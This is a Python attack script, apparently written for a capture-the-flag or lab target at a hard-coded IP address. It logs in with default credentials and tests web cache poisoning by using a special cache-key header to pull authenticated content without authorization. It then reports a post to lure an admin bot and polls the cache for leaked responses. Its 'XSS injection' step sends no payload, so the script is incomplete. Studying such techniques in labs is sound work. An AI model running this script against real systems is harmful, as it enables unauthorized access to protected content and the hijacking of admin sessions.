import requests
import time

SERVER_URL = "http://54.198.62.41"

def login_user(username="user", password="user123"):
    """Login and get token"""
    login_data = {
        "username": username,
        "password": password
    }
    r = requests.post(f"{SERVER_URL}/api/auth/login", json=login_data)
    return r.json()['token']

def test_cache_bypass():
    user_token = login_user()
    print(f"[+] Got user token: {user_token[:20]}...")

    # Test 1: Normal auth request with cache key
    print("\n[1] Making normal auth request with cache key...")
    headers = {
        'Authorization': f'Bearer {user_token}',
        'X-Special-Key': 'secret_cache_key',
        'Accept': 'text/html'
    }
    r1 = requests.get(f"{SERVER_URL}/api/blog/post/1", headers=headers)
    print(f"Status: {r1.status_code}")
    print(f"Cache-Control: {r1.headers.get('Cache-Control')}")
    print(f"X-Cache-Debug: {r1.headers.get('X-Cache-Debug')}")
    print(f"Response length: {len(r1.text)}")

    time.sleep(1)  # Wait for cache

    # Test 2: Try without auth but with cache key
    print("\n[2] Trying without auth but with cache key...")
    no_auth_headers = {
        'X-Special-Key': 'secret_cache_key',
        'Accept': 'text/html'
    }
    r2 = requests.get(f"{SERVER_URL}/api/blog/post/1", headers=no_auth_headers)
    print(f"Status: {r2.status_code}")
    print(f"Cache-Control: {r2.headers.get('Cache-Control')}")
    print(f"X-Cache-Debug: {r2.headers.get('X-Cache-Debug')}")
    print(f"Can access content: {len(r2.text) > 0}")
    print(f"Content matches: {r1.text == r2.text}")

    # If we can access content without auth, let's try XSS
    if r2.status_code == 200:
        print("\n[3] Testing XSS in cached content...")
        xss_headers = {
            'Authorization': f'Bearer {user_token}',
            'X-Special-Key': 'secret_cache_key',
            'Accept': 'text/html'
        }
        # Trying to inject XSS
        r3 = requests.get(f"{SERVER_URL}/api/blog/post/1", headers=xss_headers)
        print(f"XSS Status: {r3.status_code}")
        print(f"Content-Type: {r3.headers.get('Content-Type')}")
        
        # Verify cached XSS
        time.sleep(1)
        r4 = requests.get(f"{SERVER_URL}/api/blog/post/1", headers=no_auth_headers)
        print(f"\nVerifying cached content:")
        print(f"Status: {r4.status_code}")
        print(f"Cache hit: {r4.headers.get('X-Cache-Debug')}")
        print(f"Response preview: {r4.text[:200]}")

        # Report post to trigger admin
        print("\n[4] Reporting post to trigger admin visit...")
        report_data = {"postId": 1}
        r5 = requests.post(
            f"{SERVER_URL}/api/blog/report",
            headers={'Authorization': f'Bearer {user_token}'},
            json=report_data
        )
        print(f"Report status: {r5.status_code}")

        # Monitor for changes
        print("\nMonitoring cache for admin visit...")
        start_time = time.time()
        seen = set()
        while time.time() - start_time < 10:
            r = requests.get(f"{SERVER_URL}/api/blog/post/1", headers=no_auth_headers)
            if r.text not in seen:
                print(f"\nNew response found!")
                print(f"Status: {r.status_code}")
                print(f"Length: {len(r.text)}")
                print(f"Preview: {r.text[:200]}")
                seen.add(r.text)
            time.sleep(0.5)

if __name__ == "__main__":
    print("[+] Testing cache poisoning vulnerability...")
    test_cache_bypass()